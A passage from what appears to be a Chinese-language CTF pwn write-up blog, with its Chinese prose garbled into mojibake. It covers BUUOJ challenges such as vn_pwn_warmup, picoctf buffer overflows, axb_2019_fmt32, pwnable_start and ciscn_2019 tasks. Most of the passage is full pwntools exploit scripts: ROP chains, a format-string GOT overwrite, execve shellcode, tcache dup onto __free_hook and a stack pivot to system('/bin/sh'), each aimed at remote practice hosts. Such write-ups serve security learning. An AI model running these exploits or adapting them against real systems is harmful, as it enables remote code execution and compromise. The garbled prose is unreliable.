ˆç©ºé—´è¾ƒå¤§ï¼Œä¸”ä¸ç¬¬äºŒä¸ªå¯ä»¥æº¢å‡ºçš„æ ˆæ˜¯<strong>ç´§é‚»</strong>çš„ã€‚ç„¶åï¼Œå°±å¯ä»¥åœ¨æº¢å‡ºæ—¶è¦†ç›–ä¸€ä¸‹è¿”å›åœ°å€ï¼Œè¦†ç›–ä¸ºretï¼Œè¿™æ ·å°±å¯ä»¥å¤šä¸€ä¸ªretï¼Œä»è€Œ<strong>æ¥ç€æ‰§è¡Œ</strong>ä¸Šä¸€ä¸ªæ ˆå¸§bufé‡Œé¢æ„é€ çš„ropé“¾ã€‚</p><p>å¹¶ä¸”åœ¨orwä¸­ï¼Œopenå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ—¶ä¸€ä¸ªæŒ‡é’ˆåœ°å€(<code>*filename</code>)ï¼Œæ‰€ä»¥éœ€è¦å…ˆreadä¸€ä¸‹flagçš„æ–‡ä»¶ååˆ°ä¸€ä¸ªbufå½“ä¸­ï¼Œç„¶åå†è¿›è¡Œorwã€‚</p><p>Bufçš„å¯»æ‰¾ï¼š<br>åœ¨libcä¸­æ‰¾ä¸€ä¸ªæ²¡æœ‰ç”¨åˆ°çš„åœ°å€æ®µå³å¯ã€‚æ¯”å¦‚<code>__free_hook</code></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/B3tfJG.png" srcset="/img/loading.gif" alt></p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./vn_pwn_warmup&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,27585)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()ru(&#39;0x&#39;)libc_base = int(r(12),16) - libc.sym[&#39;puts&#39;]info_addr(&#39;libc_base&#39;,libc_base)pop_rdi = 0x0000000000021102 + libc_basepop_rsi = 0x00000000000202e8 + libc_basepop_rdx = 0x0000000000001b92 + libc_baseopen = libc_base+libc.sym[&#39;open&#39;]read = libc_base+libc.sym[&#39;read&#39;]puts = libc_base+libc.sym[&#39;puts&#39;]buf = libc_base+libc.sym[&#39;__free_hook&#39;]payload = flat([    pop_rdi,0,pop_rsi,buf,pop_rdx,8,read,    pop_rdi,buf,pop_rsi,0,pop_rdx,0,open,    pop_rdi,3,pop_rsi,buf,pop_rdx,0x30,read,    pop_rdi,buf,puts])sa(&#39;:&#39;,payload)# debug()ret = libc_base + 0x0000000000000937payload = &#39;a&#39; * 0x78 + p64(ret)sa(&#39;?&#39;,payload)sleep(1)# debug()s(&#39;./flag\x00\x00&#39;)itr()</code></pre><h2 id="picoctf-2018-buffer-overflow-1"><a href="#picoctf-2018-buffer-overflow-1" class="headerlink" title="picoctf_2018_buffer overflow 1"></a><code>picoctf_2018_buffer overflow 1</code></h2><p>ç®€å•çš„æ ˆæº¢å‡ºï¼Œä¸”å­˜åœ¨åé—¨ã€‚</p><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./PicoCTF_2018_buffer_overflow_1&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29988)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()win = 0x080485CBoffset = 0x28 + 0x4payload = &#39;a&#39;*offset + p32(win)sa(&#39;:&#39;,payload)itr()</code></pre><h2 id="picoctf-2018-buffer-overflow-2"><a href="#picoctf-2018-buffer-overflow-2" class="headerlink" title="picoctf_2018_buffer overflow 2"></a><code>picoctf_2018_buffer overflow 2</code></h2><p>ç±»ä¼¼ä¸Šé¢˜ï¼Œè€ƒä¸ªæ§åˆ¶ä¼ å‚ã€‚</p><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./PicoCTF_2018_buffer_overflow_2&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29988)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()win = 0x80485CBoffset = 0x6c + 0x4payload = &#39;a&#39;*offset + p32(win) + p32(0xDEADBEEF) + p32(0xDEADBEEF) + p32(0xDEADC0DE)s(payload)</code></pre><h2 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a><code>axb_2019_fmt32</code></h2><p>32ä½çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œè€ƒçš„æ˜¯å•æ¬¡printfå¤šæ¬¡å†™å…¥ï¼Œå› ä¸ºæ˜¯32ä½pwntoolsçš„<code>fmtstr_payload</code>æ˜¯ååˆ†å¥½ç”¨çš„ã€‚</p><h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./axb_2019_fmt32&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29147)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()printf_got = 0x804A014payload = &quot;%9$sA&quot; + p32(0x804A014)sla(&#39;me:&#39;,payload)ru(&#39;Repeater:&#39;)printf_got = uu32(r(4))libc_base = printf_got - 0x049020info_addr(&#39;libc_base&#39;,libc_base)offset = 8rce = libc_base + 0x3a80cinfo_addr(&#39;rec&#39;,rce)payload = &#39;a&#39; + fmtstr_payload(offset,{0x804A014:rce},write_size = &quot;byte&quot;,numbwritten = 10)sla(&#39;me:&#39;,payload)itr()</code></pre><h2 id="pwnable-start"><a href="#pwnable-start" class="headerlink" title="pwnable_start"></a><code>pwnable_start</code></h2><h3 id="åˆ†æ-7"><a href="#åˆ†æ-7" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>32ä½ï¼Œæ— ä»»ä½•ä¿æŠ¤ï¼Œä½œè€…è‡ªå·±æ±‡ç¼–å†™çš„ç¨‹åºã€‚<br>åˆ†ææ±‡ç¼–ä»¥åå¯ä»¥è®¤ä¸ºå°±æ˜¯ï¼š</p><pre><code class="c">write(1,esp,20)read(0,esp,60)</code></pre><p>ååˆ†æ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯éš¾ç‚¹åœ¨shellcodeæ‘†ä¸Šæ ˆä»¥åï¼Œå¦‚ä½•è·³è½¬è¿‡å»æ‰§è¡Œã€‚</p><p>åˆ©ç”¨æ€è·¯ï¼š</p><ul><li>åˆ©ç”¨æ§åˆ¶eipï¼Œè¿”å›wirteå¤„ï¼Œæ³„æ¼ä¸€ä¸‹æ ˆåœ°å€ï¼Œç„¶åæ ¹æ®åç§»ç®—å‡ºespçš„åœ°å€</li><li>æ‘†shellcodeä¸Šæ ˆï¼Œæ§åˆ¶å¥½eip</li></ul><h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./start&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,27834)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()# debug()payload = &#39;a&#39; * 0x14 + p32(0x08048087)sa(&quot;:&quot;,payload)new_esp = uu32(r(4)) - 4addr_shellcode = new_esp + 0x14 + 4info_addr(&#39;new esp&#39;,new_esp)shellcode  = &quot;\x31\xc0\x50\x68\x2f\x2f\x73&quot;shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89&quot;shellcode += &quot;\xe3\x89\xc1\x89\xc2\xb0\x0b&quot;shellcode += &quot;\xcd\x80\x31\xc0\x40\xcd\x80&quot;s(&#39;a&#39; * 0x14 + p32(addr_shellcode) + shellcode)itr()</code></pre><p>Shell code ç½‘ä¸Šä¸€æ‰¾æœ‰å¾ˆå¤šï¼Œæ‰¾åˆ°ä¸€ä¸ªåˆé€‚å­—èŠ‚é™åˆ¶ï¼Œä¸”å¯ä»¥æ‰§è¡Œçš„å³å¯ã€‚</p><h2 id="inndy-rop"><a href="#inndy-rop" class="headerlink" title="inndy_rop"></a><code>inndy_rop</code></h2><p>åšæ³•è·Ÿ <code>cmcc_simplerop</code>åŸºæœ¬ä¸€æ ·ï¼Œé™¤äº†åç§»ã€‚</p><p>32ä½ä¸‹ï¼Œ<code>sys_execve(&quot;sh&quot;, 0, 0, 0)</code> è¡Œä¸é€šã€‚ï¼ˆä¸Šæ¥æµ‹è¯•è¿™ä¸ªï¼Œæµ‹è¯•ä¸€é˜µå­ï¼‰</p><h2 id="BJDCTF-2nd-secret"><a href="#BJDCTF-2nd-secret" class="headerlink" title="BJDCTF 2nd secret"></a>BJDCTF 2nd secret</h2><h3 id="åˆ†æ-8"><a href="#åˆ†æ-8" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>æ…¢æ…¢åˆ†æå¯ä»¥å‘ç°ä¸€ä¸ªæº¢å‡ºç‚¹ï¼Œä¸”åˆ©ç”¨æ­¤å¤„åªæ˜¯å¯ä»¥åšåˆ°ä»»æ„åœ°å€çš„æ•°æ®å‡1ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/MX0AfS.png" srcset="/img/loading.gif" alt></p><p>ç„¶åæƒ³åˆ°å¯ä»¥åœ¨gotè¡¨å¤„ä¸‹æ‰‹ï¼Œ<strong>å…¶ä¸­printfã€systemå‡½æ•°åœ¨ç¨‹åºè¾¾åˆ°ä¸€å®šæ¡ä»¶æ‰ä¼šè¿è¡Œã€‚æ‰€ä»¥å…¶gotå¤„çš„å€¼æ˜¯ç‰¹å®šçš„ï¼Œå¹¶ä¸”æ˜¯ç›¸è¿‘çš„ã€‚</strong></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/XkCKMA.png" srcset="/img/loading.gif" alt></p><p>å¦‚å›¾æ‰€ç¤ºï¼Œç›¸å·®10ã€‚ç„¶ååˆ©ç”¨åŸæ¥çš„æº¢å‡ºç‚¹ï¼Œæ”¾å…¥printfçš„gotè¡¨åœ°å€ï¼Œè®©å…¶å‡10æ¬¡1ï¼Œä¹Ÿå°±æ˜¯ç­”å¯¹10æ¬¡serectåï¼Œè®©ç¨‹åºèµ°å‘ç»“æŸå¤„ï¼Œè°ƒç”¨printfã€‚å…¶printfçš„bufæ‰“å°çš„æ˜¯nameï¼Œè¿™ä¸ªæ˜¯å¯æ§çš„ï¼Œå†™æˆ<code>/bin/sh\x00</code>å³å¯ã€‚</p><h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./secret&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29635)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()payload = &#39;/bin/sh\x00&#39; + &quot;\x00&quot; * 8 + p64(elf.got[&#39;printf&#39;])[:5]#æ­¤å¤„payload å› ä¸ºreadé‚£é‡Œè¯»çš„æ•°æ®å¤§å°é™åˆ¶ï¼Œéœ€è¦è°ƒæ•´ä¸€ä¸‹payloadçš„é•¿åº¦ã€‚# debug()sla(&quot;What&#39;s your name?&quot;,payload)answer = [0x476B,0x2D38,0x4540,0x3E77,0x3162,0x3F7D,0x357A,0x3CF5,0x2F9E,0x41EA,0x48D8,0x2763,0x474C,0x3809,0x2E63]for i in range(len(answer)):    print(answer[i])    sa(&quot;Secret&quot;,str(answer[i]))sla(&quot;Secret&quot;,&#39;1&#39;)itr()</code></pre><h2 id="ciscn-2019-es-1"><a href="#ciscn-2019-es-1" class="headerlink" title="ciscn_2019_es_1"></a><code>ciscn_2019_es_1</code></h2><h3 id="åˆ†æ-9"><a href="#åˆ†æ-9" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>64ä½ï¼Œubuntu 18.  å­˜åœ¨ UAFï¼Œååˆ†ç®€å•çš„tcache dupæ”»å‡»ã€‚</p><h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./ciscn_2019_es_1&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29639)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]rce18 = [0x4f2c5,0x4f322,0x10a38c]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    gdb.attach(io)    pause()def add(size,name,call):    sla(&#39;ice:&#39;,&#39;1&#39;)    sla(&#39;size&#39;,str(size))    sa(&#39;name&#39;,str(name))    sa(&#39;call&#39;,str(call))def show(idx):    sla(&#39;ice&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))def call(idx):    sla(&#39;ice&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))add(0x500,&#39;chumen77&#39;,&#39;chumen77&#39;) #0add(0x80,&#39;chumen77&#39;,&#39;chumen77&#39;) #1# debug()call(0)show(0)ru(&#39;name:\n&#39;)libc_base = uu64(r(6)) - 0x3ebca0info_addr(&#39;libc&#39;,libc_base)#get libcadd(0x510-0x20-0x10,&#39;chumen77&#39;,&#39;chumen77&#39;) #2add(0x20,&#39;chumen77&#39;,&#39;chumen77&#39;) #3call(3)call(3)free_hook = libc_base + 0x3ed8e8add(0x20,p64(free_hook),p64(free_hook)) #4add(0x20,p64(free_hook),p64(free_hook)) #5rec = rce18[1] + libc_baseadd(0x20,p64(rec),p64(rec))call(1)itr()</code></pre><h2 id="ciscn-2019-s-4"><a href="#ciscn-2019-s-4" class="headerlink" title="ciscn_2019_s_4"></a><code>ciscn_2019_s_4</code></h2><h3 id="åˆ†æ-10"><a href="#åˆ†æ-10" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><pre><code class="c">int vul(){  char s; // [esp+0h] [ebp-28h]  memset(&amp;s, 0, 0x20u);  read(0, &amp;s, 0x30u);  printf(&quot;Hello, %s\n&quot;, &amp;s);  read(0, &amp;s, 0x30u);  return printf(&quot;Hello, %s\n&quot;, &amp;s);}</code></pre><ul><li>å­˜åœ¨æ ˆæº¢å‡ºï¼Œæº¢å‡º8ä¸ªå­—èŠ‚ï¼Œè€ƒè™‘æ ˆè½¬ç§»ã€‚</li><li>åœ¨å¡«å……bufï¼Œ <code>%s</code> åœ¨32ä½ç”¨äºæ³„æ¼æ ˆä¸Šçš„ä¿¡æ¯ã€‚</li></ul><p>æ‰€ä»¥å¯ä»¥è€ƒè™‘æ³„æ¼å¤„æ ˆåœ°å€ï¼Œlibcåœ°å€ã€‚ä»è€Œç®—å‡ºbufçš„baseä¸libc baseã€‚</p><p>é¦–å…ˆå¯ä»¥æ˜ç¡®ä¸€ç‚¹å¯ä»¥è¦†ç›–è¿”å›åœ°å€ï¼Œç¬¬ä¸€ä¸‹è€ƒè™‘ç›´æ¥è¦†ç›–ä¸º<code>one_gadget</code> æœ¬åœ°é€šè¿œç¨‹ä¸é€šã€‚</p><p>ç„¶åå°±è€ƒè™‘ç”¨æ ˆè½¬ç§»åˆ°bufä¸Šæ¥è·å–shellã€‚</p><h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./ciscn_s_4&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,26932)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()payload = &#39;a&#39; * (0x28 - 1 ) + &#39;b&#39;sa(&#39;name&#39;,payload)ru(&quot;b&quot;)buf_base = uu32(r(4)) - 0x38r(4)libc_base = uu32(r(4)) - 0x1fb9b0info_addr(&#39;stack&#39;,buf_base)info_addr(&#39;libc&#39;,libc_base)payload = p32(0x8048450) + p32(elf.plt[&#39;system&#39;]) + p32(0x8048450) + p32(buf_base+16) + &#39;/bin/sh\x00&#39;payload = payload.ljust((0x30-4-4-8),&#39;b&#39;) + p32(buf_base) *3+ p32(0x80485FD)s(payload)itr()</code></pre><h2 id="ciscn-2019-final-2"><a href="#ciscn-2019-final-2" class="headerlink" title="ciscn_2019_final_2"></a><code>ciscn_2019_final_2</code></h2><h3 id="åˆ†æ-11"><a href="#åˆ†æ-11" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ç¨‹åºå¾ˆç®€å•ï¼Œä½†æ˜¯ä¹Ÿå¾ˆç»†èŠ‚ï¼Œç”±äºè‡ªå·±çš„é€†å‘èƒ½åŠ›æœ‰ç‚¹å·®ï¼Œæ²¡æœ‰æ³¨æ„éƒ¨åˆ†ç»†èŠ‚ï¼Œé€ æˆæ„é€ å †å—ï¼Œè¿›è¡Œleakå’Œæ”¹å†™æ—¶ï¼Œé€ æˆè¾ƒå¤§çš„å›°éš¾å’Œè¿·æƒ‘ã€‚</p><p>å¼€å¯äº†æ²™ç›’ä¸èƒ½get shellï¼š</p><pre><code>#  line  CODE  JT   JF      K# =================================#  0000: 0x20 0x00 0x00 0x00000004  A = arch#  0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number#  0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005#  0004: 0x15 0x00 0x02 0xffffffff  if (A != 0xffffffff) goto 0007#  0005: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0007#  0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW#  0007: 0x06 0x00 0x00 0x00000000  return KILL</code></pre><h4 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><ul><li>UAF</li></ul><p>æ¯”å¦‚ï¼š</p><h4 id="ç¨‹åºå¤„ï¼š"><a href="#ç¨‹åºå¤„ï¼š" class="headerlink" title="ç¨‹åºå¤„ï¼š"></a>ç¨‹åºå¤„ï¼š</h4><h5 id="addå‡½æ•°ï¼š"><a href="#addå‡½æ•°ï¼š" class="headerlink" title="addå‡½æ•°ï¼š"></a>addå‡½æ•°ï¼š</h5><pre><code class="c">int *v0; // rbx__int16 v1; // ax</code></pre><pre><code class="c"> v0 = (int *)int_pt; *v0 = get_atoi(); *((_DWORD *)int_pt + 2) = *(_DWORD *)int_pt;</code></pre><pre><code class="c">v1 = get_atoi();*(_WORD *)short_pt = v1;*((_WORD *)short_pt + 4) = *(_WORD *)short_pt;</code></pre><p>å¼€å§‹å¯¹æ•°æ®ç±»å‹çš„å¤§å°æ²¡æœ‰æ³¨æ„ï¼Œè¿™å‡ å¤„å†³å®šç€</p><ul><li>intå‹å †å—æ—¶ï¼Œåªèƒ½å†™ä¸Š4å­—èŠ‚çš„æ•°æ®</li><li>short int å‹å †å—æ—¶ï¼Œåªèƒ½å†™ä¸Š2å­—èŠ‚çš„æ•°æ®</li></ul><h5 id="showå‡½æ•°ï¼š"><a href="#showå‡½æ•°ï¼š" class="headerlink" title="showå‡½æ•°ï¼š"></a>showå‡½æ•°ï¼š</h5><pre><code class="c">if ( v2 == 1 &amp;&amp; int_pt )    printf(&quot;your int type inode number :%d\n&quot;, *(unsigned int *)int_pt);  if ( v2 == 2 &amp;&amp; short_pt )    printf(&quot;your short type inode number :%d\n&quot;, (unsigned int)*(signed __int16 *)short_pt);</code></pre><p>æ„å‘³ç€leakæ—¶ä¹Ÿæ˜¯åªèƒ½æ³„æ¼å‡ºéƒ¨åˆ†çš„å­—èŠ‚ï¼Œå¢åŠ åœ¨åˆ©ç”¨æ—¶çš„éš¾åº¦ï¼Œéœ€è¦åˆ©ç”¨åˆé€‚çš„å †å—è¿›è¡Œæ”»å‡»ï¼Œå…¶åˆé€‚æ˜¯æŒ‡ä¸Šé¢æœ‰æ®‹ç•™åˆé€‚çš„æ•°æ®ï¼Œç„¶åæ”¹æœ«å°¾å‡ ä¸ªå­—èŠ‚ã€‚</p><h4 id="é¢„å¤‡çŸ¥è¯†"><a href="#é¢„å¤‡çŸ¥è¯†" class="headerlink" title="é¢„å¤‡çŸ¥è¯†"></a>é¢„å¤‡çŸ¥è¯†</h4><p>scanfå‡½æ•°æ˜¯ä»stdinä¸­è¯»å–æ•°æ®ï¼Œä¸”åœ¨<code>__IO_2_stdio_</code> çš„ioç»“æ„ä½“å­˜åœ¨ä¸€ä¸ª<code>_fileno</code>çš„æ ‡è¯†ä½ï¼Œé»˜è®¤å€¼æ˜¯0ï¼Œè‹¥å°†å…¶æ”¹æˆå…¶ä»–çš„æ–‡ä»¶å·ï¼Œè°ƒç”¨scanfå‡½æ•°åœ¨è·å–æ—¶ï¼Œå°±ä¼šè·å–å¯¹åº”æ–‡ä»¶ã€‚</p><h4 id="éš¾ç‚¹"><a href="#éš¾ç‚¹" class="headerlink" title="éš¾ç‚¹"></a>éš¾ç‚¹</h4><ul><li>ç¨‹åºåªè®©ä½ åˆ†é…0x30æˆ–è€…0x20çš„å †å—ï¼Œå¦‚ä½•ä¼ªé€ å‡ºä¸€ä¸ªè‡³å°‘0x90çš„å †å—ï¼Œå¦‚ä½•é‡Šæ”¾åï¼Œæ¥æ³„æ¼libcã€‚</li><li>æ³„æ¼å‡ºæ¥çš„æ•°æ®ä¸æ˜¯å®Œæ•´çš„ï¼Œå¯å†™æ—¶åªèƒ½å†™ä¸Š2ã€4å­—èŠ‚</li></ul><h3 id="exp-14"><a href="#exp-14" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./ciscn_final_2&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,25252)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(type,number):    sla(&#39;&gt;&#39;,&#39;1&#39;)    sla(&#39;&gt;&#39;,str(type))    sla(&quot;:&quot;,str(number))def free(type):    